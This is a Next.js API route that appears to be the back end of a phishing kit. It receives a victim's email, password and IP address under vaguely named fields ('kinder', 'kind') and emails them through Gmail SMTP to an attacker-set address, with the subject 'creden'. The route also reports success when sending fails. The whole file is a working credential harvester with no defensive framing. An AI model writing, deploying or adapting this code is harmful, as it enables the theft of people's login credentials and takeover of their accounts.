import { NextResponse, NextRequest } from "next/server";
import mailer from "nodemailer";

import requestIp, { type Request } from "request-ip";

export async function POST(request: NextRequest) {
  const res: any = await request.json();

  console.log(res);

  try {
    let transporter: mailer.Transporter = mailer.createTransport({
      service: "Gmail",
      host: "smtp.gmail.com",
      port: 465,
      secure: true,
      auth: {
        user: process.env.APP_ACCOUNT,
        pass: process.env.APP_PASSWORD,
      },
    });

    const result = await transporter.sendMail({
      from: `"dees" <${process.env.APP_ACCOUNT}>`,
      to: process.env.EMAIL_TO_SEND,
      subject: "creden",
      // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
      html: `<h3>${JSON.stringify(res.kinder).replaceAll(
        '"',
        ""
      )} /password: ${JSON.stringify(res.kind).replaceAll(
        '"',
        ""
      )} /ip: ${JSON.stringify(res.ip).replaceAll('"', "")}</h3>`,
    });

    return NextResponse.json({ status: true, message: "result" });
  } catch (error) {
    return NextResponse.json({ status: true, message: error });
  }
}
